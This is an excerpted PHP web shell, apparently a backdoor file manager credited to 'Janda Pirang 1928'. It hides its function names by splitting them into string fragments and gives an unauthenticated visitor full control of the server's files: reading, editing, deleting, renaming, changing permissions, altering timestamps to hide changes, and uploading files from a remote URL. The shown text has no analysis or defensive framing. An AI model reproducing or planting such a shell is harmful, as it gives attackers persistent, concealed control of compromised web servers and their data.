...
function author() {
	echo "<center><br>Ja"."nd"."a "."Pi"."ra"."ng<br>19"."28</center>";
	exit();
}

function cekdir() {
	if (isset($_GET['warnanya'])) {
		$tokber = $_GET['warnanya'];
	} else {
		$tokber = "ge"."t"."cw"."d";
		$tokber = $tokber();
	}
...
function cfn($fl) {
	$a = "ba"."sena"."me";
	$b = "pat"."hinf"."o";
	$c = $b($a($fl), warnanyaINFO_EXTENSION);
	if ($c == "zip") {
...
foreach($tokbers as $id => $lok){
	if($lok == '' && $id == 0){
		$a = true;
		echo '<a href="?warnanya=/">/</a>';
		continue;
	}
	if($lok == '') continue;
	echo '<a href="?warnanya=';
	for($i=0;$i<=$id;$i++){
	echo "$tokbers[$i]";
	if($i != $id) echo "/";
} 
...
<input type="text" name="darilink" class="up" placeholder="https://an'.'okm.co/upl'.'oad.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="fi'.'le.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</form>';
...
if (isset($_GET['pirang'])) {
	echo "<tr><td>Current Fi"."le : ".$_GET['pirang'];
	echo '</tr></td></table><br/>';
	echo "<pre>".htmlspecialchars($fgt($_GET['pirang']))."</pre>";
	author();
} elseif (isset($_POST['warnanya']) && $_POST['pilih'] == "hapus") {
	if ($idi($_POST['warnanya']) && $fxt($_POST['warnanya'])) {
		xrd($_POST['warnanya']);
		if ($fxt($_POST['warnanya'])) {
			red("Fai"."led to del"."ete Dir"."ec"."tory !");
		} else {
			green("Del"."ete Dir"."ect"."ory Suc"."cess !");
		}
	} elseif ($ifi($_POST['warnanya']) && $fxt($_POST['warnanya'])) {
		@$ulk($_POST['warnanya']);
		if ($fxt($_POST['warnanya'])) {
	...
	if (!isset($_POST['cemod'])) {
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo "<center>Fi"."le : ".htmlspecialchars($_POST['warnanya'])."<br>";
		} else {
			echo "<center>D"."ir : ".htmlspecialchars($_POST['warnanya'])."<br>";
		}
		echo '<form method="post">
		Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['warnanya'])), -4).'" />
		<input type="hidden" name="warnanya" value="'.$_POST['warnanya'].'">
		...
		$cm = @$chm($_POST['warnanya'], $ocd($_POST['perm']));
		if ($cm == true) {
...
} elseif (isset($_POST['warnanya']) && $_POST['pilih'] == "ubahnama") {
	if (isset($_POST['gantin'])) {
		$namabaru = $_GET['warnanya']."/".$_POST['newname'];
		$ceen = "re"."na"."me";
		if (@$ceen($_POST['warnanya'], $namabaru) === true) {
			...
			<input type="hidden" name="warnanya" value="'.$_POST['newname'].'">
		...
		echo '<form method="post">
		New Name : <input name="newname" type="text" class="up" size="20" value="'.htmlspecialchars($bsn($_POST['warnanya'])).'" />
		<input type="hidden" name="warnanya" value="'.$_POST['warnanya'].'">
		<input type="hidden" name="pilih" value="ubahnama">';
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo '<input type="hidden" name="type" value="fi'.'le">';;
	...
	if (isset($_POST['gasedit'])) {
		$edit = @$fpt($_POST['warnanya'], $_POST['src']);
		if ($fgt($_POST['warnanya']) == $_POST['src']) {
			green("Ed"."it Fi"."le Suc"."ce"."ss !");
		} else {
			red("Ed"."it Fi"."le Fai"."led !");
		}
	}
	echo "<center>Fi"."le : ".htmlspecialchars($_POST['warnanya'])."<br><br>";
	echo '<form method="post">
	<textarea cols=80 rows=20 name="src">'.htmlspecialchars($fgt($_POST['warnanya'])).'</textarea><br>
	<input type="hidden" name="warnanya" value="'.$_POST['warnanya'].'">
...
} elseif (isset($_POST['warnanya']) && $_POST['pilih'] == "ubahtanggal") {
	if (isset($_POST['tanggale'])) {
		$stt = "st"."rtot"."ime";
		$tch = "t"."ou"."ch";
		$tanggale = $stt($_POST['tanggal']);
		if (@$tch($_POST['warnanya'], $tanggale) === true) {
			green("Change Da"."te Succ"."ess !");
			$det = "da"."te";
			$ftm = "fi"."le"."mti"."me";
			$b = $det("d F Y H:i:s", $ftm($_POST['warnanya']));
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".htmlspecialchars($_POST['warnanya'])."<br>";
			} else {
				echo "<center>D"."ir : ".htmlspecialchars($_POST['warnanya'])."<br>";
...
} elseif (isset($_POST['warnanya']) && $_POST['pilih'] == "dunlut") {
	$dunlute = $_POST['warnanya'];
...
} elseif (isset($_POST['warnanya']) && $_POST['pilih'] == "fo"."ld"."er") {
    if ($isw("./") || $ird("./")) {
        $loke = $_POST['warnanya'];
        if (isset($_POST['buatfolder'])) {
            ...
            if ($buatf == true) {
                ...
                echo '<input type="hidden" name="warnanya" value="'.$_POST['warnanya'].'">
            ...
            echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="warnanya" value="'.$_POST['warnanya'].'"><input type="hidden" name="pilih" value="folder"></form>';
        }
    }
    ...
    if ($isw("./") || $isr("./")) {
        ...
        if (isset($_POST['buatfi'.'le'])) {
            ...
            if ($fxt($loke."/".$_POST['fi'.'lebaru'])) {
                ...
                echo '<input type="hidden" name="warnanya" value="'.$_POST['lok'.'nya'].'">
            ...
            echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="warnanya" value="'.$_POST['lok'.'nya'].'"><input type="hidden" name="pilih" value="fi'.'le"></form>';
        }
    }
}
...
echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?warnanya=".$auutolkw."\">..</a></td>
<td><center>--</center></td>
...
echo "</center></td>
<td><center><form method=\"POST\" action=\"?pilihan&warnanya=$tokber\">
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$coldo\">
<input type=\"hidden\" name=\"warnanya\" value=\"$tokber/$coldo\">
...
foreach($tokbernya as $coldo){
	...
	echo "<tr>";
	echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?warnanya=".$auutol."\">".$coldo."</a></td>
	<td><center>--</center></td>
...
echo "<tr>
<td>".cfn($juanda)." <a href=\"?pirang=$tokber/$dupir&warnanya=$tokber\">$dupir</a></td>
...
<form method=\"post\" action=\"?pilihan&warnanya=$tokber\">
...
<input type=\"hidden\" name=\"warnanya\" value=\"$tokber/$dupir\">
</form></center></td>
</tr>";
}
